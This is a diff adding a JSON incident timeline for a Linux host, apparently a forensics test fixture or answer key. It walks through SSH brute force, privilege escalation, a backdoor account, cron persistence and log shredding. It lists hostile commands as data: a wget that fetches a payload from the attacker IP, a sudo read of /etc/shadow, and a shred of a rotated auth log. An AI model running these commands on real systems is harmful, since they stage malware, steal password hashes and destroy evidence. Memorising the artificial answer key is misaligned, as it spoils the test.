@@ -1,0 +1,262 @@
+{
+  "host": "web01",
+  "timezone": "America/New_York",
+  "summary": "SSH brute force from 203.0.113.45 leads to a password login as deploy, payload staging in /tmp, sudo to a root shell, netcat install, backdoor account sysbackup (sudo group), root crontab persistence that fires after midnight, then a public-key login as sysbackup from 192.0.2.99 that reads /etc/shadow and shreds a rotated log.",
+  "steps": [
+    {
+      "id": "S01",
+      "title": "SSH brute force begins: first failed password from the attacker",
+      "utc": "2025-01-01T04:02:12Z",
+      "local": "2024-12-31 23:02:12",
+      "kind": "ssh_login_failure",
+      "user": "root",
+      "fields": {
+        "src_ip": "203.0.113.45"
+      }
+    },
+    {
+      "id": "S02",
+      "title": "Brute-force threshold crossed (5 failures from one IP within 5 minutes)",
+      "utc": "2025-01-01T04:02:50Z",
+      "local": "2024-12-31 23:02:50",
+      "kind": "ssh_login_failure",
+      "fields": {
+        "src_ip": "203.0.113.45"
+      },
+      "tag": "ssh-bruteforce"
+    },
+    {
+      "id": "S03",
+      "title": "Password login as deploy from an IP never seen for that account",
+      "utc": "2025-01-01T04:07:12Z",
+      "local": "2024-12-31 23:07:12",
+      "kind": "ssh_login_success",
+      "user": "deploy",
+      "fields": {
+        "src_ip": "203.0.113.45"
+      },
+      "tag": "ssh-new-ip"
+    },
+    {
+      "id": "S04",
+      "title": "wtmp records the interactive session on pts/1",
+      "utc": "2025-01-01T04:07:13Z",
+      "local": "2024-12-31 23:07:13",
+      "kind": "login",
+      "user": "deploy",
+      "fields": {
+        "src_ip": "203.0.113.45",
+        "tty": "pts/1"
+      }
+    },
+    {
+      "id": "S05",
+      "title": "Reconnaissance: deploy runs `id`",
+      "utc": "2025-01-01T04:08:05Z",
+      "local": "2024-12-31 23:08:05",
+      "kind": "shell_command",
+      "user": "deploy",
+      "fields": {
+        "command": "id"
+      }
+    },
+    {
+      "id": "S06",
+      "title": "Payload downloaded into /tmp",
+      "utc": "2025-01-01T04:09:02Z",
+      "local": "2024-12-31 23:09:02",
+      "kind": "shell_command",
+      "user": "deploy",
+      "fields": {
+        "command": "wget -q http://203.0.113.45/x.sh -O /tmp/.x.sh"
+      },
+      "tag": "download"
+    },
+    {
+      "id": "S07",
+      "title": "File system: hidden script /tmp/.x.sh is born",
+      "utc": "2025-01-01T04:09:03Z",
+      "local": "2024-12-31 23:09:03",
+      "kind": "file_activity",
+      "fields": {
+        "macb": "M..B",
+        "path": "/tmp/.x.sh"
+      },
+      "tag": "file.temp-hidden"
+    },
+    {
+      "id": "S08",
+      "title": "Payload made executable",
+      "utc": "2025-01-01T04:09:30Z",
+      "local": "2024-12-31 23:09:30",
+      "kind": "shell_command",
+      "user": "deploy",
+      "fields": {
+        "command": "chmod +x /tmp/.x.sh"
+      },
+      "tag": "temp-exec"
+    },
+    {
+      "id": "S09",
+      "title": "deploy escalates: sudo /bin/bash (root shell)",
+      "utc": "2025-01-01T04:10:44Z",
+      "local": "2024-12-31 23:10:44",
+      "kind": "sudo_command",
+      "user": "deploy",
+      "fields": {
+        "command": "/bin/bash",
+        "target_user": "root"
+      },
+      "tag": "root-shell"
+    },
+    {
+      "id": "S10",
+      "title": "APT transaction installs netcat-openbsd",
+      "utc": "2025-01-01T04:11:31Z",
+      "local": "2024-12-31 23:11:31",
+      "kind": "package_transaction",
+      "fields": {
+        "install": "netcat-openbsd"
+      },
+      "tag": "tool-install"
+    },
+    {
+      "id": "S11",
+      "title": "dpkg unpacks netcat-openbsd",
+      "utc": "2025-01-01T04:11:33Z",
+      "local": "2024-12-31 23:11:33",
+      "kind": "package_install",
+      "fields": {
+        "package": "netcat-openbsd"
+      },
+      "tag": "tool-install"
+    },
+    {
+      "id": "S12",
+      "title": "Backdoor account sysbackup created",
+      "utc": "2025-01-01T04:13:05Z",
+      "local": "2024-12-31 23:13:05",
+      "kind": "user_created",
+      "fields": {
+        "account": "sysbackup"
+      },
+      "tag": "new-user"
+    },
+    {
+      "id": "S13",
+      "title": "Password set for sysbackup",
+      "utc": "2025-01-01T04:13:41Z",
+      "local": "2024-12-31 23:13:41",
+      "kind": "password_changed",
+      "fields": {
+        "account": "sysbackup"
+      },
+      "tag": "account-change"
+    },
+    {
+      "id": "S14",
+      "title": "sysbackup added to the sudo group",
+      "utc": "2025-01-01T04:14:10Z",
+      "local": "2024-12-31 23:14:10",
+      "kind": "user_modified",
+      "fields": {
+        "account": "sysbackup",
+        "group": "sudo"
+      },
+      "tag": "admin-group"
+    },
+    {
+      "id": "S15",
+      "title": "Root crontab replaced",
+      "utc": "2025-01-01T04:15:22Z",
+      "local": "2024-12-31 23:15:22",
+      "kind": "crontab_change",
+      "user": "root",
+      "fields": {
+        "action": "replace"
+      },
+      "tag": "crontab"
+    },
+    {
+      "id": "S16",
+      "title": "deploy session ends (wtmp logout paired with the login)",
+      "utc": "2025-01-01T04:16:40Z",
+      "local": "2024-12-31 23:16:40",
+      "kind": "logout",
+      "user": "deploy",
+      "fields": {
+        "tty": "pts/1"
+      }
+    },
+    {
+      "id": "S17",
+      "title": "cron executes /tmp/.x.sh as root after midnight",
+      "utc": "2025-01-01T05:05:01Z",
+      "local": "2025-01-01 00:05:01",
+      "kind": "cron_command",
+      "user": "root",
+      "fields": {
+        "command": "/tmp/.x.sh"
+      },
+      "tag": "cron-temp"
+    },
+    {
+      "id": "S18",
+      "title": "sysbackup logs in by public key from a second external IP",
+      "utc": "2025-01-01T05:31:15Z",
+      "local": "2025-01-01 00:31:15",
+      "kind": "ssh_login_success",
+      "user": "sysbackup",
+      "fields": {
+        "auth_method": "publickey",
+        "src_ip": "192.0.2.99"
+      }
+    },
+    {
+      "id": "S19",
+      "title": "wtmp/utmp record the sysbackup session on pts/2",
+      "utc": "2025-01-01T05:31:16Z",
+      "local": "2025-01-01 00:31:16",
+      "kind": "login",
+      "user": "sysbackup",
+      "fields": {
+        "tty": "pts/2"
+      }
+    },
+    {
+      "id": "S20",
+      "title": "sysbackup reads /etc/shadow through sudo",
+      "utc": "2025-01-01T05:33:02Z",
+      "local": "2025-01-01 00:33:02",
+      "kind": "sudo_command",
+      "user": "sysbackup",
+      "fields": {
+        "command": "/usr/bin/cat /etc/shadow"
+      },
+      "tag": "sudo-to-root"
+    },
+    {
+      "id": "S21",
+      "title": "Anti-forensics: rotated auth log shredded",
+      "utc": "2025-01-01T05:34:10Z",
+      "local": "2025-01-01 00:34:10",
+      "kind": "shell_command",
+      "user": "sysbackup",
+      "fields": {
+        "command": "sudo shred -u /var/log/auth.log.1"
+      },
+      "tag": "anti-forensics"
+    },
+    {
+      "id": "S22",
+      "title": "File system: the shredded log's inode changes (deleted entry)",
+      "utc": "2025-01-01T05:34:13Z",
+      "local": "2025-01-01 00:34:13",
+      "kind": "file_activity",
+      "fields": {
+        "macb": "..C.",
+        "path": "/var/log/auth.log.1 (deleted)"
+      }
+    }
+  ]
+}
